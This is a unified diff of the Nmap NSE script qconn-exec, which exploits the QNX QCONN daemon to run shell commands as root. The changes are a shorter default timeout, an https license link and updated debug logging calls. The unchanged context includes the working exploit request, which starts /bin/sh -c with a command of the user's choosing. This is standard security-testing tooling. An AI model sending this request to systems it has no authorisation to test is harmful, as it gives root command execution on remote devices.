@@ -41,7 +41,7 @@ For more information about QNX QCONN, see:
 -- |_      http://metasploit.org/modules/exploit/unix/misc/qnx_qconn_exec
 --
 -- @args qconn-exec.timeout
---                 Set the timeout in seconds. The default value is 60.
+--                 Set the timeout in seconds. The default value is 30.
 --
 -- @args qconn-exec.bytes
 --                 Set the number of bytes to retrieve. The default value is 1024.
@@ -55,7 +55,7 @@ For more information about QNX QCONN, see:
 --                      - now uses the vuln library for reporting
 
 author = "Brendan Coles"
-license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
+license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
 categories = {"intrusive", "exploit", "vuln"}
 
 portrule = shortport.port_or_service ({8000}, "qconn", {"tcp"})
@@ -87,17 +87,17 @@ system commands as the 'root' user.
 
   -- Send command as service launcher request
   local req = string.format("service launcher\nstart/flags run /bin/sh /bin/sh -c \"%s\"\n", cmd)
-  stdnse.print_debug(1, "%s: Connecting to %s:%s", SCRIPT_NAME, host.targetname or host.ip, port.number)
+  stdnse.debug1("Connecting to %s:%s", host.targetname or host.ip, port.number)
   local status, data = comm.exchange(host, port, req, {timeout=timeout*1000,bytes=bytes})
   if not status then
-    stdnse.print_debug(1, "%s: Timeout exceeded for %s:%s (Timeout: %ss).", SCRIPT_NAME, host.targetname or host.ip, port.number, timeout)
+    stdnse.debug1("Timeout exceeded for %s:%s (Timeout: %ss).", host.targetname or host.ip, port.number, timeout)
     return
   end
 
   -- Parse response
-  stdnse.print_debug(2, "%s: Received reply:\n%s", SCRIPT_NAME, data)
+  stdnse.debug2("Received reply:\n%s", data)
   if not string.match(data, "QCONN") then
-    stdnse.print_debug(1, "%s: %s:%s is not a QNX QCONN daemon.", SCRIPT_NAME, host.targetname or host.ip, port.number)
+    stdnse.debug1("%s:%s is not a QNX QCONN daemon.", host.targetname or host.ip, port.number)
     return
   end
 
@@ -107,7 +107,7 @@ system commands as the 'root' user.
     local report = vulns.Report:new(SCRIPT_NAME, host, port)
     return report:make_output(vuln_table)
   else
-    stdnse.print_debug(1, "%s: %s:%s QNX QCONN daemon is not vulnerable.", SCRIPT_NAME, host.targetname or host.ip, port.number)
+    stdnse.debug1("%s:%s QNX QCONN daemon is not vulnerable.", host.targetname or host.ip, port.number)
     return
   end
 
